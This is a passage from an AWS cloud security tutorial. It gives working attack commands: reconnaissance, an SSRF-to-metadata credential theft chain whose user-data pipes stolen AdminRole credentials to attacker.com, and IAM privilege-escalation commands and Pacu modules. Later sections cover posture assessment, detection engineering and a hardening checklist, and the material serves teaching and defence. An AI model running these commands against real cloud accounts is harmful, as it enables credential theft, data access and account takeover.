# Specific IAM ARN → error message reveals if it exists:
aws iam get-user --user-name target-username 2>&1
# "NoSuchEntity" = doesn't exist
# "InvalidClientTokenId" = exists but we're unauthorized
# Error type difference reveals account enumeration

# 4. Certificate Transparency for cloud subdomains:
curl "https://crt.sh/?q=%.amazonaws.com&output=json" | \
  python3 -c "import json,sys; [print(r['name_value']) for r in json.load(sys.stdin)]" | \
  grep "target-company"

# 5. Shodan for exposed cloud services:
shodan search 'org:"Amazon.com" port:6379 country:US'  # Open Redis in AWS
shodan search 'org:"Amazon.com" "Kubernetes Dashboard"'

# 6. GitHub/Code repository secrets:
# Search for AWS keys in public repos:
trufflehog github --org=targetcompany
# Or manually search GitHub:
# "AKID" site:github.com targetcompany
# "aws_secret_access_key" site:github.com targetcompany
```

### SSRF to IMDS Attack Chain (The Capital One Attack Pattern)

```bash
# This exact technique was used in the Capital One breach (2019)

# Scenario: Application has SSRF vulnerability
# Attacker can make server fetch arbitrary URLs

# Step 1: Probe for SSRF vulnerability
# In application field that accepts URLs:
# e.g., webhook URL, avatar URL, PDF URL

# Test: http://169.254.169.254/latest/meta-data/
# If response contains AWS metadata → SSRF + IMDS access confirmed

# Step 2: Get IAM role name
curl -s "http://vulnerable-app.com/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"
# Response: ec2-production-role

# Step 3: Get IAM credentials
curl -s "http://vulnerable-app.com/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/ec2-production-role"
# Response:
# {
#   "AccessKeyId": "ASIA...",
#   "SecretAccessKey": "abcdef...",
#   "Token": "IQoJb3...",
#   "Expiration": "2024-01-01T12:00:00Z"
# }

# Step 4: Use credentials (from attacker machine)
export AWS_ACCESS_KEY_ID="ASIA..."
export AWS_SECRET_ACCESS_KEY="abcdef..."
export AWS_SESSION_TOKEN="IQoJb3..."
export AWS_DEFAULT_REGION="us-east-1"

aws sts get-caller-identity  # Confirm who you are

# Step 5: Enumerate what this role can do
# Install enumerate-iam:
pip install enumerate-iam
enumerate-iam --access-key $AWS_ACCESS_KEY_ID \
              --secret-key $AWS_SECRET_ACCESS_KEY \
              --session-token $AWS_SESSION_TOKEN

# Step 6: Abuse access (example - read all S3)
aws s3 ls                          # List all buckets this role can see
aws s3 cp s3://target-bucket/sensitive.txt -  # Read sensitive data

# Step 7: Try privilege escalation
# Common PrivEsc: iam:PassRole + ec2:RunInstances
# Create EC2 instance with admin role → access admin credentials via IMDS
aws ec2 run-instances \
  --image-id ami-12345678 \
  --instance-type t2.micro \
  --iam-instance-profile Name=AdminRole \
  --user-data '#!/bin/bash
    TOKEN=$(curl -X PUT http://169.254.169.254/latest/api/token -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
    curl -H "X-aws-ec2-metadata-token: $TOKEN" \
      http://169.254.169.254/latest/meta-data/iam/security-credentials/AdminRole \
      | curl -d @- http://attacker.com/capture'

# DEFENSE: IMDSv2 + least privilege IAM
# With IMDSv2: SSRF cannot get IMDS credentials (PUT not followed by SSRF)
# With least privilege: role only has READ on specific S3 buckets
```

### IAM Privilege Escalation Techniques (Lab Only)

```bash
# Tool: aws-escalate (enumerate PrivEsc paths)
pip install aws-escalate
aws-escalate --profile victim-role

# Common PrivEsc paths:
# 1. iam:CreatePolicyVersion → replace policy with admin version
aws iam create-policy-version \
  --policy-arn arn:aws:iam::123456789:policy/target-policy \
  --policy-document '{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Action":"*","Resource":"*"}]}' \
  --set-as-default

# 2. iam:AttachUserPolicy / iam:AttachRolePolicy
aws iam attach-user-policy \
  --user-name target-user \
  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess

# 3. iam:PassRole + lambda:CreateFunction + lambda:InvokeFunction
# Create Lambda with admin role → invoke to create new admin user
aws lambda create-function \
  --function-name privesc \
  --runtime python3.9 \
  --role arn:aws:iam::123456789:role/admin-role \
  --handler lambda_function.handler \
  --zip-file fileb://privesc.zip

# Pacu — AWS exploitation framework
pip install pacu
pacu
# Pacu commands:
# run iam__enum_permissions
# run iam__privesc_scan
# run ec2__enum
# run s3__download_bucket --bucket target-bucket
```

### Cloud Security Posture Assessment Lab

```bash
# Prowler — comprehensive AWS security assessment (open source)
pip install prowler
prowler aws --output-formats json html csv \
  --output-directory ./prowler-results

# Check specific categories:
prowler aws --categories infrastructure_security
prowler aws --categories access_management
prowler aws --categories data_protection
prowler aws --categories logging

# ScoutSuite — multi-cloud security auditing
pip install scoutsuite
scout aws --report-name security-audit

# CloudMapper — visualize AWS network topology
pip install cloudmapper
python cloudmapper.py collect --account my-account
python cloudmapper.py prepare --account my-account
python cloudmapper.py webserver  # View at localhost:8000

# Manual checks for critical issues:
# 1. Public S3 buckets
aws s3api list-buckets --query 'Buckets[*].Name' --output text | \
  xargs -I{} aws s3api get-bucket-acl --bucket {} 2>/dev/null | grep -i "AllUsers"

# 2. Security groups with 0.0.0.0/0 on sensitive ports
aws ec2 describe-security-groups \
  --query 'SecurityGroups[?IpPermissions[?IpRanges[?CidrIp==`0.0.0.0/0`]]].{ID:GroupId,Name:GroupName,Rules:IpPermissions[?IpRanges[?CidrIp==`0.0.0.0/0`]]}'

# 3. Check for root account MFA
aws iam get-account-summary | grep "AccountMFAEnabled"
# 0 = ROOT ACCOUNT HAS NO MFA — critical finding

# 4. Find unused IAM access keys
aws iam generate-credential-report
aws iam get-credential-report --query 'Content' --output text | base64 -d | \
  awk -F',' 'NR>1 && $9=="true" {print $1, $10, $11}'
# Shows users with access keys and last used date
# Keys unused for 90+ days → should be disabled

# 5. CloudTrail enabled in all regions?
aws cloudtrail describe-trails --include-shadow-trails \
  --query 'trailList[*].{Name:Name,MultiRegion:IsMultiRegionTrail,LogValidation:LogFileValidationEnabled}'

# 6. GuardDuty enabled?
aws guardduty list-detectors
# Empty = GuardDuty not enabled! → zero threat detection

# 7. ECR images scanned for vulnerabilities?
aws ecr describe-repositories \
  --query 'repositories[*].{Name:repositoryName,Scan:imageScanningConfiguration}'
```

### Cloud Security Monitoring — Detection Engineering

```bash
# CloudTrail → CloudWatch → Alerts for critical events

# Create metric filter for: root account login
aws logs put-metric-filter \
  --log-group-name CloudTrail \
  --filter-name RootLogin \
  --filter-pattern '{ $.userIdentity.type = "Root" && $.userIdentity.invokedBy NOT EXISTS && $.eventType != "AwsServiceEvent" }' \
  --metric-transformations metricName=RootLoginCount,metricNamespace=Security,metricValue=1

aws cloudwatch put-metric-alarm \
  --alarm-name RootLoginAlarm \
  --metric-name RootLoginCount \
  --namespace Security \
  --statistic Sum \
  --period 300 \
  --threshold 1 \
  --comparison-operator GreaterThanOrEqualToThreshold \
  --evaluation-periods 1 \
  --alarm-actions arn:aws:sns:us-east-1:123456789:security-alerts

# GuardDuty — automated threat detection
aws guardduty create-detector --enable --finding-publishing-frequency FIFTEEN_MINUTES

# GuardDuty finding types to know:
# UnauthorizedAccess:EC2/SSHBruteForce
# Recon:EC2/PortProbeUnprotectedPort
# Trojan:EC2/DNSDataExfiltration      ← DNS tunneling detected!
# CredentialAccess:IAMUser/AnomalousBehavior
# Impact:S3/MaliciousIPCaller         ← S3 access from known malicious IP
# Persistence:IAMUser/NetworkPermissions ← New SG/NACL changes

# AWS Security Hub — aggregates all findings
aws securityhub enable-security-hub \
  --enable-default-standards  # CIS, AWS Foundational, PCI-DSS

# EventBridge rule for immediate response (Lambda remediation):
aws events put-rule \
  --name "GuardDutyHighFinding" \
  --event-pattern '{"source":["aws.guardduty"],"detail-type":["GuardDuty Finding"],"detail":{"severity":[{"numeric":[">=",7]}]}}'
# Triggers Lambda to: isolate instance, snapshot EBS, notify security team
```

### Best Practices Checklist — Cloud Networking Security

```
IDENTITY & ACCESS:
  ✓ Enable MFA for root and all IAM users
  ✓ Use IAM roles (not users) for EC2/Lambda/ECS
  ✓ Enforce IMDSv2 org-wide via SCP
  ✓ Rotate access keys, audit with credential report
  ✓ Use AWS SSO/Identity Center for human access
  ✓ Enable SCPs at Organization level

NETWORK:
  ✓ No 0.0.0.0/0 on SSH/RDP/database ports in SGs
  ✓ Use SG references instead of CIDR for inter-service traffic
  ✓ Enable VPC Flow Logs on all VPCs
  ✓ Use VPC Endpoints for S3/DynamoDB (remove NAT dependency)
  ✓ Restrict S3 access via VPC Endpoint policy + bucket policy
  ✓ Use AWS Network Firewall for perimeter inspection
  ✓ Deploy in multiple AZs (one NAT GW per AZ)

DATA:
  ✓ S3 Block Public Access at account level (never disable)
  ✓ Enable S3 Versioning + Replication for critical data
  ✓ Encrypt all S3 with SSE-KMS (not SSE-S3 for sensitive data)
  ✓ Enable RDS encryption at rest + in transit
  ✓ Disable EBS encryption opt-out via SCP

MONITORING:
  ✓ CloudTrail multi-region enabled with log validation
  ✓ GuardDuty enabled in ALL regions (not just main region)
  ✓ Security Hub enabled with CIS standards
  ✓ Config Rules for continuous compliance
  ✓ SNS alerts for critical GuardDuty + CloudTrail events

INCIDENT RESPONSE:
  ✓ Documented runbooks for EC2 isolation, S3 exposure
  ✓ Lambda automation for common response actions
  ✓ AWS Backup for all critical data
  ✓ Test DR failover quarterly
```

---

*This document covers Networking for Cloud, DevOps and Cybersecurity .*

*Standards & References: RFC 7230 (HTTP/1.1), RFC 7540 (HTTP/2), RFC 9000 (QUIC/HTTP3), AWS Well-Architected Framework — Security Pillar, CIS Kubernetes Benchmark, NIST SP 800-190 (Container Security), OWASP Cloud Security Testing Guide*